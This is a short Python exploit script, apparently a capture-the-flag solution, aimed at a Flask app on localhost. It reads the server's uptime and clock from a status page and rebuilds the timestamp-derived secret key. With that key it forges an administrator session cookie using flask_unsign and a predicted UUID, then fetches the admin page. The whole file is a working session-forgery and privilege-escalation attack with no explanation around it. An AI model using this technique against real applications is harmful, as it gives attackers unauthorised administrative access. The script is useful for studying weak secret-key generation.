import requests
import uuid
from flask_unsign.session import sign

import hashlib
from datetime import datetime, timedelta
host = 'http://localhost:9999'
url = host+'/admin'
def forge_uuid(username):
    secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
    return uuid.uuid5(secret, username)
session = {
    'is_admin': True,
    'uid': str(forge_uuid('administrator')),
    'username': 'administrator'
}
status_url = host+'/status'
status_response = requests.get(status_url).text
uptime_str = status_response.split("Server uptime: ")[1].split("<br>")[0].strip()
server_time_str = status_response.split("Server time: ")[1].strip()
print(f"Server uptime: {uptime_str}")
print(f"Server time: {server_time_str}")
time_parts = uptime_str.split(":")
hours = int(time_parts[0])
minutes = int(time_parts[1])
seconds = int(time_parts[2])
uptime_seconds = hours * 3600 + minutes * 60 + seconds
server_start_time = datetime.strptime(server_time_str, '%Y-%m-%d %H:%M:%S') - timedelta(seconds=uptime_seconds)
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
constructed_secret =  hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
flask_session = sign(session, constructed_secret)
response = requests.get(url, cookies={'session': flask_session})
print(response.text)
